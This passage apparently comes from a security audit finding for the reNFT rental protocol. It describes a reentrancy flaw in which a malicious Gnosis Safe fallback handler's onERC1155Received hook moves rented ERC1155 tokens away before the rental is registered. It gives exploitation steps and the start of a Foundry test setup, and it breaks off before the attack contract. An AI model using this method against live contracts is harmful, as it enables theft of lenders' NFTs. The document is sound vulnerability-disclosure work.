      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says \"If I see something unknown, then I just let the fallback handler deal with it.\"\n\n    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.\n\n    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)\n\n***\n\n### The Vulnerability\n\n***\n\nIn order to make sense of the vulnerability, we need to understand the token transferral & rental registeration execution flow first.\n\n**Step 1**: First of all, before the fulfillment process begins, both the lender and the borrower need to approve the Seaport Conduit to spend their tokens on behalf of them. The lender approves the conduit to spend the NFT token which he wants to lend (offer item) and the borrower approves the ERC20 tokens he will use as a payment method for this rental (consideration item).\n\n**Step 2**: Once the fulfillment process begins, the conduit begins the token transferral process. The conduit transfers the lender's NFT tokens to the borrower's gnosis rental safe, then it transfers the borrower's ERC20 tokens to the Payment Escrow.\n\n*Note 1: Keep in mind that the rental is not registered yet.*.\n\n*Note 2: The Seaport Conduit utilizes the `safeTransferFrom` function to transfer the ERC1155 tokens which will trigger `onERC1155Receive` hook on the receiver of the ERC1155 tokens, in this case, it's the borrower's rental safe. However, when it comes to the transferral of ERC721 tokens, it uses `transferFrom` and not `safeTransferFrom`*.\n\n**Step 3**: Once the tokens are transferred, Seaport will communicate with the Zone contract. You can think of the zone contract as a contract holding a callback function which is called after all the swaps are made. The contract which will be holding the callback function to be executed by Seaport is [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) and the callback function it is holding, which as I mentioned, will be called by Seaport, is [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27).\n\n**Step 4**: Once the [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27) function is called, the rental registeration process will kick in. A series of internal functions will be called inside [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) which will verify the signatures of the order data it has received from seaport and then the internal function [\\_rentFromZone](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L530) will be called and this internal function will actually register the rental. It'll communicate with the [`Storage`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol) module which holds all the rental data and ask it to [add the rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595).\n\n**Step 5**: The rental is finally added.\n\nHere is the full execution flow.\n\n*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588).*\n\n***\n\n### The vulnerability\n\n***\n\nThe main vulnerability exists within the fact that reNFT does not register the rental except after swapping the tokens, in addition to `safeTransferFrom()` being used to transfer ERC1155 tokens, which would of course, trigger the callback function `onERC1155Receive()` on the borrower's safe.\n\nThe combination of those two factors allow for the exploitation of a reentrancy vulnerability allowing an attacker to hijack ANY ERC1155 tokens he rents.\n\n### Steps of exploitation\n\n***\n\n1.  The attacker will create a custom fallback handler contract which will contain an implementation of the `onERC1155Receive()` function, which will be triggered by the Seaport Conduit when it conducts the token swap and moves the lender's NFT tokens to the borrower's safe. The implementation of the `onERC1155Receive()` function will simply instruct the gnosis safe to transfer the tokens to the attacker's address.\n\n    **Since the rental is not yet registered, the guard will let the transferral occur normally**\n\n2.  The attacker will create the rental safe which he'll utilize to hijack the target ERC1155 token.\n\n3.  The attacker will set the fallback handler address of his safe to be the address of the custom fallback handler contract he created.\n\n4.  The attacker will initiate the rental process\n\n5.  When the conduit transfers the lender's ERC1155 token to the attacker's safe using `safeTransferFrom`. It'll request to call `onERC1155Receive()` on the attacker's safe, but the `onERC1155Receive()` callback function isn't implemented by default in the safe contract, so the safe contract will rely on the custom fallback handler (which the attacker set) and the `onERC1155Receive()` function in the fallback handler will be executed.\n\n6.  When the `onERC1155Receive()` callback is executed in the custom fallback handler contract, the fallback handler will instruct gnosis to move the ERC1155 token rented to the attacker's address. The gnosis guard will be disarmed and will allow the transferral to occur normally because it isn't aware of the rental at this point.\n\n7.  The ERC1155 token will be hijacked successfully.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC1155_Exploit -vvv`\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(tokenCallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n\n    interface ERC1155TokenReceiver {\n\n        function onERC1155Received(\n            address _operator,\n            address _from,\n            uint256 _id,\n            uint256 _value,\n            bytes calldata _data\n        ) external returns (bytes4);\n\n        function onERC1155BatchReceived(\n            address _operator,\n            address _from,\n            uint256[] calldata _ids,\n            uint256[] calldata _values,\n            bytes calldata _data\n        ) external returns (bytes4);\n    }\n\n    interface ERC721TokenReceiver {\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);\n    }\n\n    interface IERC165 {\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n\n    /**\n    * Borrowed from gnosis safe smart contracts\n    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.\n    * @author Richard Meissner - @rmeissner\n    */\n    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {\n        /**\n        * @notice Handles ERC1155 Token callback.\n        * return Standardized onERC1155Received return value.\n        */\n        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0xf23a6e61;\n        }\n\n        /**\n        * @notice Handles ERC1155 Token batch callback.\n        * return Standardized onERC1155BatchReceived return value.\n        */\n        function onERC1155BatchReceived(\n            address,\n            address,\n            uint256[] calldata,\n            uint256[] calldata,\n            bytes calldata\n        ) external pure override returns (bytes4) {\n            return 0xbc197c81;\n        }\n\n        /**\n        * @notice Handles ERC721 Token callback.\n        *  return Standardized onERC721Received return value.\n        */\n        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0x150b7a02;\n        }\n\n        /**\n        * @notice Handles ERC777 Token callback.\n        * return nothing (not standardized)\n        */\n        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {\n            // We implement this for completeness, doesn't really have any value\n        }\n\n        /**\n        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.\n        * @param interfaceId Id of the interface.\n        * @return if the interface is supported.\n        */\n        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n            return\n                interfaceId == type(ERC1155TokenReceiver).interfaceId ||\n                interfaceId == type(ERC721TokenReceiver).interfaceId ||\n                interfaceId == type(IERC165).interfaceId;\n        }\n\n    }\n\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    